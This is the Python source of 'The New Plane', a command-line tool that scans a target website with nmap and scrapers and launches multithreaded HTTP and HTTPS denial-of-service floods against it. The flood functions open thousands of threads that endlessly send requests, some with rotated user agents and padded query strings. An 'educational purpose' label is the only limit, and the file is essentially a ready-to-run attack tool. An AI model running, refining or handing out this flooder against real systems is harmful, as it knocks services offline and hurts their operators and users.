import argparse, socket, threading, sys, time, random, ssl, nmap, re, requests
from bs4 import BeautifulSoup

def arguments_and_variables():
    parser = argparse.ArgumentParser(
        description="The New Plane (TNP) is a tool for Scan and DoS Attack of Website, it's only for educational purpose",
        epilog=("examples:\n"
                "  python %(prog)s -s example.com\n"
                "  python %(prog)s -t 5000 -at 172.16.152.5\n"
                "  python %(prog)s -p 3000 -s 172.30.24.12"),
        formatter_class=argparse.RawTextHelpFormatter)
    
    parser.add_argument('DOMAIN', help='Set a IP or Domain of a website', type=str)
    parser.add_argument('-s', '--scan', help='Make a scan and return the response', action='store_true')
    parser.add_argument('-at', '--attackhttp', help='Make a DoS attack on a HTTP website', action='store_true')
    parser.add_argument('-as', '--attackhttps', help='Make a DoS attack on a HTTPS website', action='store_true')
    parser.add_argument('-t', '--threads', help='To specify the threads | default: 2500', type=int, metavar='N°')
    parser.add_argument('-p', '--port', help='To specify the port | default HTTP: 80 | default HTTPS: 443', type=int, metavar='N°')
    parser.add_argument('-V', '--version', action='version', version='%(prog)s Version 2.1')   
    
    args = parser.parse_args()
    
    global settings, input_value
    
    settings = {'scan': args.scan,
                'attackhttp': args.attackhttp,
                'attackhttps': args.attackhttps,
                'threads': args.threads,
                'port': args.port}
    
    input_value = args.DOMAIN

def scan():
    print(f"Scanning '\033[95m{input_value}\033[0m'...")
    port = '' if settings['port'] == None else str(settings['port'])
    domain = input_value
    ip = socket.gethostbyname(domain) if re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', domain) == [] else domain
    scan = nmap.PortScanner().scan(ip, arguments='-sV -T5')['scan'].get(ip, {}).get('tcp', {})

    if scan.get(443, None) != None:
        url = f'https://{domain}/' if port == '' else f'https://{domain}:{port}/'
    else:
        url = f'http://{domain}/' if port == '' else f'http://{domain}:{port}/'
    
    req = requests.get(url)
    html = req.text
    beauti = BeautifulSoup(html, 'html.parser')
    req_robot = requests.get(url + 'robots.txt')
    html_robot = req_robot.text
    
    def show_info():
        print('_'*60 + f"""\n
\033[91mWebsite Information:\033[m
                IP: {ip}
                Domain: {domain}
                URL: {url}
        \n""" + '_'*60)
    
    def link_scan():
        if re.findall(r'href=[\'"]?(http[^\'" #>]+)', html) != [] and req.status_code == 200:
            search_links = re.findall(r'href=[\'"]?(http[^\'" #>]+)', html)
            filtered_links = [link for link in search_links if link != url]
            
            print("\n\033[91mLinks found:\033[m")
            for num, link in enumerate(filtered_links, start=1):
                print(f"  {num}. {link}")
                
            print('\n' + '_'*60)
        
        if set(re.findall(r'/.+', html_robot)) != [] and req_robot.status_code == 200:
            search_links_robots = set(re.findall(r'/.+', html_robot))
            filtered_links_robots = [link for link in search_links_robots if domain not in link]
            
            print("\n\033[91mLinks found in '/robots.txt':\033[m")
            for num, link in enumerate(filtered_links_robots, start=1):
                print(f"  {num}. {url[:-1]+link}")
        
            print('\n' + '_'*60)
    
    def port_scan():
        if scan != {}:
            print("\n\033[91mPorts scanned:\033[m")
            for ports, data in scan.items():
                for key, value in data.items():
                    if value == '':
                        data[key] = 'Not Found'

                print((f"  Port {ports}:\n"
                       f"    State: {data['state']} | Service: {data['name']} | Product: {data['product']} | Version: {data['version']}\n"))
            print('_'*60)
    
    def input_scan():
        if beauti.find_all('input') != []:
            print("\n\033[91mInputs found:\033[m")
            
            for num, input in enumerate(beauti.find_all('input'), start=1):
                print((f"  {num}. Name: {input.get('name', 'None')}  |  ID: {input.get('id', 'None')}\n"
                       f"  |  Type: {input.get('type', 'None')}  |  Value: {input.get('value', 'None')}\n"))
            
            print('_'*60)

    show_info()    
    link_scan()
    port_scan()
    input_scan()

def get_http():
    ip = input_value
    port = 80 if settings['port'] == None else settings['port']
    nthr = 2500 if settings['threads'] == None else settings['threads']
    
    def maketheattack():
        try:
            while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(20)
                s.connect((ip, port))
                s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (ip, port))
                s.sendto((f"Host: {ip}\r\n\r\n").encode('ascii'), (ip, port))
                s.close()
        except Exception as e:
            randomnum = random.randint(94,96)
            print(f'\033[{randomnum}m_{e}\033[0m', end='')
            sys.exit()
    
    print(f"Starting the attack on: \033[95m{ip}\033[0m | Port: {port}...\nNumber of threads attacking: \033[91m{nthr}\033[0m")
          
    for _ in range(nthr):
        thr = threading.Thread(target=maketheattack)
        thr.start()
    
    thr.join()
    time.sleep(5)
    print(f'\n\n\033[91mThe attack was stoped\033[0m')

def random_https():
    user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0", 
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.961.47 Safari/537.36 Edg/93.0.961.47",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"]
    
    ip = input_value
    port = 443 if settings['port'] == None else settings['port']
    nthr = 2500 if settings['threads'] == None else settings['threads']
    
    def maketheattack():
        try:
            while True:
                request = [f"GET / HTTP/1.1\r\nHost: {ip}\r\nuser-agent:{random.choices(user_agent)[0]}\r\n\r\n ",
                f"POST / HTTP/1.1\r\nHost: {ip}\r\nuser-agent:{random.choices(user_agent)[0]}\r\n\r\n ",
                f"HEAD / HTTP/1.1\r\nHost: {ip}\r\nuser-agent:{random.choices(user_agent)[0]}\r\n\r\n ",
                f"PUT / HTTP/1.1\r\nHost: {ip}\r\nuser-agent:{random.choices(user_agent)[0]}\r\n\r\n ",
                f"GET /?s={'A'*random.randint(1,1000)} HTTP/1.1\r\nHost: {ip}\r\nuser-agent:{random.choices(user_agent)[0]}\r\n\r\n"]
                
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.verify_mode = ssl.CERT_REQUIRED
                context.check_hostname = True
                context.load_default_certs()
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ss = context.wrap_socket(s, server_hostname=ip)
                ss.settimeout(20)
                ss.connect((ip, port))
                ss.send(random.choices(request)[0].encode('ascii'))
                ss.close()
        except Exception as e:
            randomnum = random.randint(94,96)
            print(f'\033[{randomnum}m_{e}\033[0m', end='')
            sys.exit()
        
    print(f"Starting the attack on: \033[95m{ip}\033[0m | Port: {port}...\nNumber of threads attacking: \033[91m{nthr}\033[0m")
    
    for _ in range(nthr):
        thr = threading.Thread(target=maketheattack)
        thr.start()
    
    thr.join()
    time.sleep(5)
    print('\n\033[91mThe attack was stoped\033[0m')

def main():
    logo = '''\033[91m
████████╗██╗░░██╗███████╗  ███╗░░██╗███████╗░██╗░░░░░░░██╗
╚══██╔══╝██║░░██║██╔════╝  ████╗░██║██╔════╝░██║░░██╗░░██║
░░░██║░░░███████║█████╗░░  ██╔██╗██║█████╗░░░╚██╗████╗██╔╝
░░░██║░░░██╔══██║██╔══╝░░  ██║╚████║██╔══╝░░░░████╔═████║░
░░░██║░░░██║░░██║███████╗  ██║░╚███║███████╗░░╚██╔╝░╚██╔╝░
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░
        ██████╗░██╗░░░░░░█████╗░███╗░░██╗███████╗
        ██╔══██╗██║░░░░░██╔══██╗████╗░██║██╔════╝
        ██████╔╝██║░░░░░███████║██╔██╗██║█████╗░░
        ██╔═══╝░██║░░░░░██╔══██║██║╚████║██╔══╝░░
        ██║░░░░░███████╗██║░░██║██║░╚███║███████╗
         \033[0m'''

    print(logo)
    
    arguments_and_variables()
    
    if (settings['scan'] and settings['attackhttp']) or (settings['scan'] and settings['attackhttps']) or (settings['attackhttp'] and settings['attackhttps']):
        print('        \033[95mYou can only choose one of the options!\033[0m')
        quit()
    
    if settings['scan']:
        scan()
    elif settings['attackhttp']:
        get_http() 
    elif settings['attackhttps']:
        random_https()
    else:
        print("              \033[95mYou didn't choose an option\033[0m")

if __name__ == '__main__':
    main()
